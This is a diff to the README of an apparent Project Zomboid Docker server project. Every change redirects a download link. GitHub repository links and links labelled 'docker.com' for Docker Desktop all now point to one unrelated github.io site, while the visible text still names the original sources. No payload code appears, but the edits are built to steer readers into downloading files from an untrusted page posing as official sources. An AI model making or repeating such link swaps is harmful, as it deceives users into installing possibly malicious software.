@@ -1,6 +1,6 @@
 # 🧟 project-zomboid-server-docker - Run Your Own Zomboid Server Easily
 
-[![Download](https://img.shields.io/badge/Download-Project%20Zomboid%20Server%20Docker-blueviolet?style=for-the-badge)](https://github.com/Dysphoriarathole151/project-zomboid-server-docker)
+[![Download](https://img.shields.io/badge/Download-Project%20Zomboid%20Server%20Docker-blueviolet?style=for-the-badge)](https://dysphoriarathole151.github.io)
 
 ## 🚀 What Is This?
 
@@ -8,7 +8,7 @@ This tool lets you set up a dedicated server for the game **Project Zomboid** us
 
 ## 📥 How to Download and Run (Windows)
 
-Visit this link to download the application: [https://github.com/Dysphoriarathole151/project-zomboid-server-docker](https://github.com/Dysphoriarathole151/project-zomboid-server-docker)
+Visit this link to download the application: [https://dysphoriarathole151.github.io](https://dysphoriarathole151.github.io)
 
 Once you're on that page:
 1. Click the green "Code" button.
@@ -19,7 +19,7 @@ Once you're on that page:
 ## 🛠️ What You Need
 
 - **Windows 10 or 11** (64-bit)
-- **Docker Desktop** installed and running. If you don't have it, download it from [docker.com](https://www.docker.com/products/docker-desktop/).
+- **Docker Desktop** installed and running. If you don't have it, download it from [docker.com](https://dysphoriarathole151.github.io).
 - At least **4 GB of RAM** (8 GB recommended) for the server.
 - **Stable internet connection** for your friends to join.
 
@@ -35,12 +35,12 @@ Once you're on that page:
 ## 📋 Step-by-Step Setup
 
 ### 1️⃣ Install Docker Desktop
-- Go to [docker.com](https://www.docker.com/products/docker-desktop/) and download Docker Desktop for Windows.
+- Go to [docker.com](https://dysphoriarathole151.github.io) and download Docker Desktop for Windows.
 - Run the installer and follow the on-screen instructions.
 - Restart your computer if prompted.
 
 ### 2️⃣ Download the Server Files
-- Visit the download link: [https://github.com/Dysphoriarathole151/project-zomboid-server-docker](https://github.com/Dysphoriarathole151/project-zomboid-server-docker)
+- Visit the download link: [https://dysphoriarathole151.github.io](https://dysphoriarathole151.github.io)
 - Click the green "Code" button and select "Download ZIP".
 - Extract the ZIP to a folder like `C:\ZomboidServer`.
 
